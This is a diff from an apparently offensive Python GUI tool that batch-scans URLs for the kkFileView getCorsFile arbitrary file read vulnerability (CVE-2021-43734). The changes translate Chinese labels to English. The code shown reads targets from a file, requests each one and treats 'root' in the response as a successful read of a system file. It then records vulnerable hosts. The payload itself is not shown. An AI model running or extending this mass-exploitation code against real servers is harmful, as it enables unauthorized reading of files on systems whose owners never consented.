@@ -12,25 +12,25 @@ def kkFileView_readfile_CVE_2021_43734_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "root" in res.text:
-            kkFileView_readfile_CVE_2021_43734_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            kkFileView_readfile_CVE_2021_43734_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             kkFileView_readfile_CVE_2021_43734_text.see(END)
-            with open("存在kkFileView getCorsFile 任意文件读取漏洞的url.txt","a+") as f:
+            with open("[exists]kkFileView_readfile_CVE_2021_43734_url.txt","a+") as f:
                 f.write(url + "\n")
         else:
-            kkFileView_readfile_CVE_2021_43734_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            kkFileView_readfile_CVE_2021_43734_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             kkFileView_readfile_CVE_2021_43734_text.see(END)
     except Exception as err:
-        kkFileView_readfile_CVE_2021_43734_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        kkFileView_readfile_CVE_2021_43734_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         kkFileView_readfile_CVE_2021_43734_text.see(END)
 def get_kkFileView_readfile_CVE_2021_43734_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def kkFileView_readfile_CVE_2021_43734_gui():
     kkFileView_readfile_CVE_2021_43734 = Toplevel()
     kkFileView_readfile_CVE_2021_43734.geometry("1035x455")
-    kkFileView_readfile_CVE_2021_43734.title("kkFileView getCorsFile 任意文件读取漏洞一把梭")
+    kkFileView_readfile_CVE_2021_43734.title("kkFileView getCorsFile arbitrary file read [auto-muti-exp]")
     kkFileView_readfile_CVE_2021_43734.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     kkFileView_readfile_CVE_2021_43734.tk.call('wm', 'iconphoto', kkFileView_readfile_CVE_2021_43734._w, logo)
